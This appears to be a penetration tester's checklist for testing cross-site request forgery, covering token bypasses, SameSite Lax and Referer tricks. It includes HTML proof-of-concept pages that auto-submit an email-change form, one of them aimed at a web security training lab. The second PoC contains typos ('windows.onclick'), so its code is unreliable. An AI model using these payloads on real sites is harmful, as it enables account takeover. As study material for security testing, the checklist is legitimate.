Should test on 'Chrome'
Payload generator: https://csrfshark.github.io/app/
- [ ] Session handling mechanism (token, csrf, JWT)
- [ ] Identify cookie protections (HTTPOnly, Secure, SameSite)
- [ ] Manipulate Referer, then attempt to remove it entirely
- [ ] Identify gadgets and interesting endpoints
### CSRF Token Bypasses
- [ ] Remove CSRF token entirely
- [ ] Changing method POST -> GET (remove csrf token)
- [ ] CSRF token of controlled account
- [ ] CSRF key + CSRF token of different account <- Gadget to set cookie required
- [ ] Double CSRF (just need to be the same) <- Gadget to set cookie required
### SameSite: Lax
- [ ] Method Override
- [ ] Chrome 120s window
### Referer Bypasses
- [ ] Referer header present
```html
<meta name="referrer" content="no-referrer">

<meta name="referrer" content="never">
```
- [ ] Referer url bypass
### Caveats
Form submission payload
- Sending a GET request before form submission
```html
<html> 
	<body> <!-- this is to send a GET request before form submission --> 
	<form action="https://vulnerable-website.com/email/change" method="POST">
		<input type="hidden" name="email" value="pwned@evil-user.net" />
	</form> 
	<img src=http://vulnerable-website.com/path onerror='document.forms[0].submit()'> 
	</body> 
</html>
```
Refresh token onclick (Chromium browser when SameSite not set, 120s time window)
```html
<!DOCTYPE html>
<html lang="en"> 
<body> 
<h1>Form CSRF PoC</h1> 
	<form method="POST" action="https://0a2400b603f490d68220296600b80036.web-security-academy.net/my-account/change-email"> 
		<input type="hidden" name="email" value="pwn@csrf.com"> 
		<input type="submit" value="Submit Request"> 
	</form> 
</body> 
<script> // This CSRF payload when user click on page: // - sends a request to refresh cookie endpoint // - wait for cookie refresh, then submit form (SameSite: Lax bypass) 
	windows.onclick = () => {
		windows.open('https://0a2400b603f490d68220296600b80036.web-security-academy.net/social-login'); 
		setTimeout(sendForm, 10000); 
	} 
	
	function sendForm() { 
		document.forms[0].submit(); 
	} 
</script> 
</html>
```
JSON payload
